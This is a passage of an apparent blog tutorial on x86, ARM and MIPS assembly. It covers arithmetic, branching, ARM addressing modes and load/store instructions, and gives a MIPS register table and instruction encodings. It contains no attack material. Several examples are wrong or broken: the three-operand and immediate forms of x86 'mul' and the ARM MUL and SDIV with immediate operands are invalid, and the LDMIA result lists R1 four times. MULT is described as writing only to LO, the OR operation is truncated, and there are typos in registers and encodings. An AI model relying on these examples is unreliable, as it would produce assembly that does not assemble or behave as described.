<p>The first way only has 1 argument. This means that the <code>eax</code> register is taken and multiplied by that value.<br>The second way shows that the multiplication of the two end arguments are stored  into  the first  argument  register.<br>The  last  way  multiplies  the  value  in  the  first  argument register and the value in the second argument and stores the result in the first argument register.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mul</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">edx</span>, <span class="number">3</span>, <span class="number">6</span></span><br><span class="line"><span class="keyword">mul</span> <span class="built_in">ecx</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>For division the instructions are split up into multiple steps using the <code>eax</code> and <code>ecx</code> register.<br>The <code>eax</code> register stores the dividend while the <code>ecx</code> register stores the divisor.<br>The resulting answer is stored in <code>eax</code> with the remainder in <code>edx</code>.<br>In following codes, the first line stores 16 in register <code>eax</code>. The second line stores 5 in <code>ecx</code>. The last instruction divides 16 by 5. It then stores the result, 3, in <code>eax</code>. The remainder, 1, is stored in <code>edx</code>.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="number">5</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">ecx</span></span><br></pre></td></tr></table></figure>

<p>Branching is an important aspect to understand in any assembly language. <code>x86</code> uses jumps to denote branches. A few jump commands are shown below.<br>These command include a jump if values are equal to each other, not equal to each other, or greater than or less than zero.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">JMP</span>     jump</span><br><span class="line"><span class="keyword">JE</span>      jump if equal to</span><br><span class="line"><span class="keyword">JLE</span>     jumpif less than <span class="keyword">or</span> equal to</span><br><span class="line"><span class="keyword">JNZ</span>     jump if <span class="keyword">not</span> <span class="meta">zero</span></span><br><span class="line"><span class="keyword">JZ</span>      jump if <span class="meta">zero</span></span><br><span class="line"><span class="keyword">JBE</span>     jump if below <span class="keyword">or</span> equal to</span><br><span class="line"><span class="keyword">JGE</span>     jump if greater than <span class="keyword">or</span> equal to</span><br></pre></td></tr></table></figure>

<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h3 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h3><p><code>ARM</code> has 37 registers each of size 32-bits.<br>The general purpose registers  are labeled <code>r0</code>-<code>r12</code>.<br>There is a stack pointer (<code>SP</code>) register, link register (<code>LR</code>), and program counter (<code>PC</code>) register.<br><code>SP</code> is also known as <code>r13</code>, <code>LR</code> is known as <code>r14</code>, and <code>PC</code> is known as <code>r15</code>.</p>
<p>The syntax for addition,subtraction, multiplication, and division operations are all similar for Intel syntax, with the operation coming first, the destination coming second, and the two values being operated on coming last.<br><code>AT&amp;T</code> syntax is the other way around,with the destination address coming last. However, these examples will all use the Intel syntax. Examples are shown below.</p>
<p>The first line shows the addition of the value in register <code>r1</code> and 7 stored into the <code>r0</code> register. The second line subtracts 8 from the value in <code>r3</code> and stores the result in the <code>r0</code> register. The third line multiplies 5 and 6 and stores the answer in the <code>r0</code> register. The final line divides 12 by 4 and stores the result in the <code>r0</code> register.</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span> <span class="built_in">r0</span>, <span class="built_in">r1</span>, <span class="number">7</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">r0</span>, <span class="built_in">r3</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">MUL</span> <span class="built_in">r0</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line"><span class="symbol">SDIV</span> <span class="built_in">r0</span>, <span class="number">12</span>, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><code>ARM</code> uses branches to transition code. The syntax is similar to the jumping as shown in the <code>x86</code> architecture. Example <code>ARM</code> branch operations are shown below.<br>There are branches for if a value is greater than or equal to another value or less than or equal to another value.</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BGE</span>     Branch <span class="meta">if</span> greater than or equal to</span><br><span class="line"><span class="keyword">BLE</span>     Branch <span class="meta">if</span> less than or equal to</span><br><span class="line"><span class="keyword">BLT</span>     Branch <span class="meta">if</span> less than</span><br><span class="line"><span class="keyword">BNE</span>     Branch <span class="meta">if</span> not equal to zero</span><br></pre></td></tr></table></figure>

<h3 id="Addressing"><a href="#Addressing" class="headerlink" title="Addressing"></a>Addressing</h3><ol>
<li><p>LDMIA R0 , {R1,R2,R3,R4}<br>LDM is: Multi-register &quot;internal access&quot; instruction<br>IA indicates that R0 is incremented by 1 word after each LDM instruction ends.<br>The final result is R1 &#x3D; [R0], R1 &#x3D; [R0+#4], R1 &#x3D; [R0+#8], R1 &#x3D; [R0+#0xC]</p>
</li>
<li><p>Stack addressing (FA, EA, FD, ED)<br>STMFD SP! , {R1-R7, LR} @ Push R1<del>R7 and LR onto the stack<br>LDMFD SP! , {R1-R7, LR} @ Pop R1</del>R7 and LR</p>
</li>
<li><p>Block copy addressing<br>LDM and STM are instruction prefixes, indicating multi-register addressing, instruction suffixes (IA, DA, IB, DB).<br>LDMIA R0!, {R1-R3} @Retrieve 3 words from the memory address pointed to by R0 to the R1, R2, R3 registers<br>STMIA R0!, {R1-R3} @ Stores the contents stored by R1, R2, and R3 in the memory pointed to by R0.</p>
</li>
<li><p>Relative addressing<br>With the current value of the current program counter PC as the base address, the label mark position is offset, and the two are added together.<br>To a valid address.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BL NEXT</span><br><span class="line">    ...        </span><br><span class="line">NEXT:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Instruction-set"><a href="#Instruction-set" class="headerlink" title="Instruction set"></a>Instruction set</h3><ol>
<li><p>Since the arm chip is updated very quickly, there are many instruction sets. The most common ones are the arm instruction set and the Thumb instruction set.</p>
</li>
<li><p>Jump instruction<br>Arm implements two types of jumps, one is to use jump instructions directly, and the other is to directly assign values to PC registers.</p>
</li>
</ol>
<ul>
<li>B jump instruction<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Structure B&#123;cond&#125; label</span><br><span class="line">Jump directly, such as `BNE LABEL`</span><br></pre></td></tr></table></figure></li>
<li>BL jump instruction<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Structure BL&#123;cond&#125; label</span><br><span class="line">When the BL instruction is executed, if the condition is satisfied, the address of the next instruction of the current instruction is first assigned to the R14 register (LR).</span><br><span class="line">Then jump to the address marked by the label to continue execution. Generally used in process calls, after the process is over, return via `MOV PC, LR`</span><br></pre></td></tr></table></figure></li>
<li>BX jump instruction with state switching<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Structure BX&#123;cond&#125;Rm</span><br><span class="line">When the BX instruction is executed, if the condition is satisfied, it will judge whether the bit [0] of the Rm register is 1, and if it is 1, the T flag of the CPSR register is automatically set to 1 at the time of the jump, and the instruction at the target position is Resolved as a Thumb instruction. Conversely, if bit [0] of the Rm register is 0, the T flag of the CPSR register is reset and the instruction at the target position is interpreted as an arm instruction.</span><br></pre></td></tr></table></figure></li>
<li>as follows:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADR R0, thumbcode + 1</span><br><span class="line">BX R0 @ Jump to thumbcode. And the processor runs in thumb mode</span><br><span class="line">thumbcode:</span><br><span class="line">.code 16</span><br></pre></td></tr></table></figure></li>
<li>BLX jump instruction with link and state switch<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Structure BLX&#123;cond&#125;Rm</span><br><span class="line">The BLX instruction aggregates the functions of BL and BX, and simultaneously saves the return address to R14 (LR) on the function of BX.</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>Register access instruction<br>Memory access instruction operations include loading data from a memory area, storing data to a memory, exchanging data between registers and memory, and the like.</li>
</ol>
<ul>
<li><p><code>LDR</code><br>Put the data in memory into the register<br>Example of instruction:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDRH R0, [R1] ; Read halfword data with memory address R1 into register R0 and clear the upper 16 bits of R0.</span><br><span class="line">LDRH R0, [R1, #8] ; Read halfword data with memory address R1+8 into register R0 and clear the upper 16 bits of R0.</span><br><span class="line">LDRH R0, [R1, R2] ; Read halfword data with memory address R1+R2 into register R0 and clear the upper 16 bits of R0.</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>STR</code><br>The STR is used to store data to an address. The format is as follows:<br>STR{type}{cond}Rd,label<br>STRD {cond} Rd, Rd2, label<br>The usage is as follows:<br><code>STR R0,[R2,#04]</code> Store the value of R0 at the address of R2+4</p>
</li>
<li><p><code>LDM</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDM&#123;addr_mode&#125;&#123;cond&#125;Rn&#123;!&#125;reglist</span><br></pre></td></tr></table></figure></li>
<li><p>This instruction is to allocate the data in the stack in memory to the register in batches, that is, the pop operation.<br>&gt; Special note, ! is an optional suffix. If there is! Then the final address will be written back to the Rn register.</p>
</li>
<li><p><code>STM</code><br>The STM stores the data of a register list into a specified address location. Format is as follows</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STM&#123;addr_mod&#125;&#123;cond&#125;Rn&#123;!&#125;reglist</span><br></pre></td></tr></table></figure></li>
<li><p><code>PUSH&amp;&amp;POP</code><br>The format is as follows:<br>PUSH {cond} reglist<br>POP {cond}<br>Stack operation instruction</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH &#123;r0,r4-r7&#125;</span><br><span class="line">POP &#123;r0,r4-r7&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>SWP</code></p>
</li>
</ul>
<ol start="4">
<li>Data exchange between registers.<br>The format is <code>SWP&#123;B&#125;&#123;cond&#125;Rd,Rm,[Rn]</code><br>B is an optional byte. If there is B, the byte is exchanged. Otherwise, the word is exchanged.<br>Rd is a temporarily stored register, and Rm is the value to be replaced.<br>Rn is the data address of &#96;to be replaced&#39;</li>
</ol>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>The whole list can be found in <a class="link"   href="https://iitd-plos.github.io/col718/ref/arm-instructionset.pdf" >arm-instructionset.pdf<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="http://pages.cs.wisc.edu/~markhill/restricted/arm_isa_quick_reference.pdf" >arm_isa_quick_reference.pdf<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="http://imrannazar.com/ARM-Opcode-Map" >ARM-Opcode-Map<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><p>In  <code>MIPS</code>,  there  are  32  registers  of  size  32-bits  that  are  for  use  with  integer  and  logic instructions.<br>They are labeled <code>$0</code> - <code>$31</code>.<br>Table in the following shows this usage of these 32 registers. There are registers for a dedicated zero value, return values, temporary data, saved registers, etc.</p>
<table>
<thead>
<tr>
<th>Register Number</th>
<th>Conventional Name</th>
<th>Usage</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>$zero</td>
<td>Hard-wired to 0</td>
</tr>
<tr>
<td>$1</td>
<td>$at</td>
<td>Reserved for pseudo-instructions</td>
</tr>
<tr>
<td>$2 - $3</td>
<td>$v0 - $v1</td>
<td>Return values from functions</td>
</tr>
<tr>
<td>$4 - $7</td>
<td>$a0 - $a3</td>
<td>Arguments to functions, not preserved by subprograms</td>
</tr>
<tr>
<td>$8 - $15</td>
<td>$t0 - $t7</td>
<td>Temporary data, not preserved by subprograms</td>
</tr>
<tr>
<td>$16 - $23</td>
<td>$s0 - $s7</td>
<td>Saved registers, preserved by subprograms</td>
</tr>
<tr>
<td>$24 - $25</td>
<td>$t8 - $t9</td>
<td>More temporary registers, not preserved by subprograms</td>
</tr>
<tr>
<td>$26 - $27</td>
<td>$k0 - $k1</td>
<td>Reserved for kernel</td>
</tr>
<tr>
<td>$28</td>
<td>$gp</td>
<td>Global Area Pointer</td>
</tr>
<tr>
<td>$29</td>
<td>$sp</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td>$30</td>
<td>$fp</td>
<td>Frame Pointer</td>
</tr>
<tr>
<td>$31</td>
<td>$ra</td>
<td>Return Address</td>
</tr>
</tbody></table>
<p>MIPS as a load-store architecture means that when we want to access memory we must access it through load and store instructions. All other instructions (add, sub, mul, div, and so on) must fetch their operands from the register and store their results in registers. For example, the following example:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sum = x + y</span><br></pre></td></tr></table></figure>
<p>We assume that sum and x , y are variables in the program, and their MIPS assembly is expressed as:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sum = x + y</span><br><span class="line"></span><br><span class="line">lw      $t0, x          # Load x from memory into a CPU register</span><br><span class="line">lw      $t1, y          # Load y from memory into a CPU register</span><br><span class="line">add     $t0, $t0, $t1   # Add x and y</span><br><span class="line">sw      $t0, sum        # Store the result from the CPU register to memory</span><br></pre></td></tr></table></figure>

<p>The MIPS32 architecture also defines three special registers, <code>PC</code> (program counter), <code>HI</code> (multiply and divide result high register), and <code>LO</code> (multiply and divide result low register). When multiplying, <code>HI</code> and <code>LO</code> hold the result of the multiplication, where <code>HI</code> holds the upper 32 bits and <code>LO</code> holds the lower 32 bits. In the division operation, <code>HI</code> saves the remainder and the <code>LO</code> saves the quotient.</p>
<h3 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h3><p>Arithmetic syntax for <code>MIPS</code> is similar to that of <code>ARM</code>. Examples for addition, subtraction, multiplication,  and  division  are  shown below.<br>The  results  for  division  and  multiplication  are stored in the special register <code>$LO</code></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>, $<span class="built_in">s1</span>, $<span class="built_in">s2</span></span><br><span class="line"><span class="keyword">sub </span>$<span class="built_in">s4</span>, $<span class="built_in">s5</span>, $<span class="built_in">s0</span></span><br><span class="line"><span class="keyword">mult </span>$<span class="built_in">s3</span>, %<span class="built_in">t4</span></span><br><span class="line"><span class="keyword">div </span>$<span class="built_in">s2</span>, $<span class="built_in">t0</span></span><br></pre></td></tr></table></figure>
<p>In <code>MIPS</code>, there are branches to move around code, similar to <code>ARM</code>. Following part shows some common branch instructions. <code>MIPS</code> is different from the other referenced architectures in that it utilizes the branch delay slot.<br>The branch delay slot means that after a branch operation is reached, the  instruction  after  the  branch  will  be  executed  before  the  branch  itself  is  taken.</p>
<p>The  <code>BEQ</code> instruction will compare two values. If the values are equal to each other, then the branch will be taken.<br>Similarly, <code>BNE</code> will compare two values and if the values are not equal, the branch will be taken.<br><code>BGEZ</code> will compare a register to 0. If the value is greater than zero, the branch will be taken.<br>The opposite is true for <code>BLTZ</code>, where the branch will be taken if the value being compared is less than zero.</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEQ </span>    <span class="keyword">Branch </span>if equal to</span><br><span class="line"><span class="keyword">BNE </span>    <span class="keyword">Branch </span>if not equal</span><br><span class="line"><span class="keyword">BGEZ </span>   <span class="keyword">Branch </span>if greater than <span class="keyword">or </span>equal to <span class="built_in">zero</span></span><br><span class="line"><span class="keyword">BLTZ </span>   <span class="keyword">Branch </span>if less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure>

<p>Detailed part:</p>
<p><strong>ADD – Add (with overflow)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Adds two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s + $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>add $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssh tttt dddd d000 0010 0000</code></td>
</tr>
</tbody></table>
<p><strong>ADDI – Add immediate (with overflow)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Adds a register and a sign-extended immediate value and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; $s + imm; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>addi $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0010 00ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>ADDIU – Add immediate unsigned (no overflow)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Adds a register and a sign-extended immediate value and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; $s + imm; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>add $ t, $ s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0010 01ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>ADDU – Add unsigned (no overflow)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Adds two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s + $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>addu $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 0001</code></td>
</tr>
</tbody></table>
<p><strong>AND – Bitwise and</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Bitwise ands two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s &amp; $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>and $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 0100</code></td>
</tr>
</tbody></table>
<p><strong>ANDI – Bitwise and immediate</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Bitwise ands a register and an immediate value and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; $s &amp; imm; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>andi $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0011 00ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BEQ – Branch on equal</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the two registers are equal</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &#x3D;&#x3D; $t advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>beq $s, $t, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0001 00ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BGEZ – Branch on greater than or equal to zero</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is greater than or equal to zero</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &gt;&#x3D; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bgez $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 01ss sss0 0001 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BGEZAL – Branch on greater than or equal to zero and link</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is greater than or equal to zero and saves the return address in $31</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &gt;&#x3D; 0 $31 &#x3D; PC + 8 (or nPC + 4); advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bgezal $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 01ss sss1 0001 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BGTZ – Branch on greater than zero</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is greater than zero</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &gt; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bgtz $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0001 11ss sss0 0000 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BLEZ – Branch on less than or equal to zero</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is less than or equal to zero</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt;&#x3D; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>blez $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0001 10ss sss0 0000 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BLTZ – Branch on less than zero</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is less than zero</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bltz $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 01ss sss0 0000 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BLTZAL – Branch on less than zero and link</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the register is less than zero and saves the return address in $31</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; 0 $31 &#x3D; PC + 8 (or nPC + 4); advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bltzal $s, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 01ss sss1 0000 iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>BNE – Branch on not equal</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Branches if the two registers are not equal</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s !&#x3D; $t advance_pc (offset &lt;&lt; 2)); else advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>bne $s, $t, offset</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0001 01ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>DIV – Divide</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Divides $s by $t and stores the quotient in $LO and the remainder in $HI</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$LO &#x3D; $s &#x2F; $t; $HI &#x3D; $s % $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>div $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt 0000 0000 0001 1010</code></td>
</tr>
</tbody></table>
<p><strong>DIVU - Divide unsigned</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Divides $s by $t and stores the quotient in $LO and the remainder in $HI</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$LO &#x3D; $s &#x2F; $t; $HI &#x3D; $s % $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>divu $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt 0000 0000 0001 1011</code></td>
</tr>
</tbody></table>
<p><strong>J – Jump</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Jumps to the calculated address</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>PC &#x3D; nPC; nPC &#x3D; (PC &amp; 0xf0000000)</td>
</tr>
<tr>
<td>Syntax:</td>
<td>j target</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 10ii iiii iiii iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>JAL – Jump and link</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Jumps to the calculated address and stores the return address in $31</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$31 &#x3D; PC + 8 (or nPC + 4); PC &#x3D; nPC; nPC &#x3D; (PC &amp; 0xf0000000)</td>
</tr>
<tr>
<td>Syntax:</td>
<td>jal target</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 11ii iiii iiii iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>JR – Jump register</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Jump to the address contained in register $s</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>PC &#x3D; nPC; nPC &#x3D; $s;</td>
</tr>
<tr>
<td>Syntax:</td>
<td>jr $s</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss sss0 0000 0000 0000 0000 1000</code></td>
</tr>
</tbody></table>
<p><strong>LB – Load byte</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>A byte is loaded into a register from the specified address.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; MEM[$s + offset]; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>lb $t, offset($s)</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>1000 00ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>LUI – Load upper immediate</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>The immediate value is shifted left 16 bits and stored in the register. The lower 16 bits are zeroes.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; (imm &lt;&lt; 16); advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>lui $t, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0011 11-- ---t tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>LW – Load word</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>A word is loaded into a register from the specified address.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; MEM[$s + offset]; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>lw $t, offset($s)</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>1000 11ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>MFHI – Move from HI</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>The contents of register HI are moved to the specified register.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $HI; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>mfhi $d</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 0000 0000 0000 dddd d000 0001 0000</code></td>
</tr>
</tbody></table>
<p><strong>MFLO – Move from LO</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>The contents of register LO are moved to the specified register.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $LO; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>mflo $d</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 0000 0000 0000 dddd d000 0001 0010</code></td>
</tr>
</tbody></table>
<p><strong>MULT - Multiply</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Multiplies $s by $t and stores the result in $LO.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$LO &#x3D; $s * $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>mult $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt 0000 0000 0001 1000</code></td>
</tr>
</tbody></table>
<p><strong>MULTU - Multiply unsigned</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Multiplies $s by $t and stores the result in $LO.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$LO &#x3D; $s * $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>multu $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt 0000 0000 0001 1001</code></td>
</tr>
</tbody></table>
<p><strong>NOOP – no operation</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Performs no operation.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>noop</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 0000 0000 0000 0000 0000 0000 0000</code></td>
</tr>
</tbody></table>
<p>Note: The encoding for a NOOP represents the instruction SLL $0, $0, 0 which has no side effects. In fact, nearly every instruction that has $0 as its destination register will have no side effect and can thus be considered a NOOP instruction.</p>
<p> <strong>OR – Bitwise or</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Bitwise logical ors two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s</td>
</tr>
<tr>
<td>Syntax:</td>
<td>or $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 0101</code></td>
</tr>
</tbody></table>
